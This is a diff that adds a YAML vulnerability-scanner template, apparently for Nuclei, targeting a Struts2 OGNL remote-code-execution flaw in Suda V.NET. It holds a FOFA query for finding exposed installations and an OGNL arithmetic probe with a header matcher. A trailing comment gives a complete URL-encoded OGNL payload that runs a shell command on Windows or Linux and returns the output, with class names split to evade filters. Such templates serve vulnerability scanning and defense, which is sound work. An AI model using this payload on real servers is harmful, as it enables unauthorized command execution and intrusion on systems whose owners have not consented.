@@ -1,0 +1,29 @@
+id: suda-vnet-struts2-rce
+
+info:
+  name: suda-vnet-struts2-rce
+  author: unknow
+  severity: high
+  description: 速达 V.NET 存在struts2 rce漏洞。
+  tags:  suda,rce
+  metadata:
+    fofa-qeury: body="速达软件技术（广州）有限公司"
+
+http:
+  - raw:
+      - |              
+        POST /home HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+        Content-type: application/x-www-form-urlencoded
+
+        redirect:%25{40012*43801}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==302 && contains(header, "1752565612")'
+
+#执行whoami：
+#redirect%3a%24%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29%2c%23_memberAccess%3dnew+com.opensymphony.xwork2.ognl.SecurityMemberAccess%28true%29%2c%23commods%3d%27whoami%27%2c%23iswin%3d%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%2c%23outmansec%3d%28%23iswin%3f%28new+java.lang.String%5b%5d%7b%27cmd.exe%27%2c%27%2fc%27%2c%23commods%7d%29%3a%28new+java.lang.String%5b%5d%7b%27bash%27%2c%27-c%27%2c%23commods%7d%29%29%2c%23a%3dnew+java.lang.ProcessBuilder%28%23outmansec%29.start%28%29.getInputStream%28%29%2c%23s%3dnew+java.util.Scanner%28%23a%29.useDelimiter%28%27%5c%5cAAAA%27%29%2c%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%27%27%2c%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29%2c%23resp.setCharacterEncoding%28%27GB2312%27%29%2c%23resp.getWriter%28%29.println%28%23str%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d
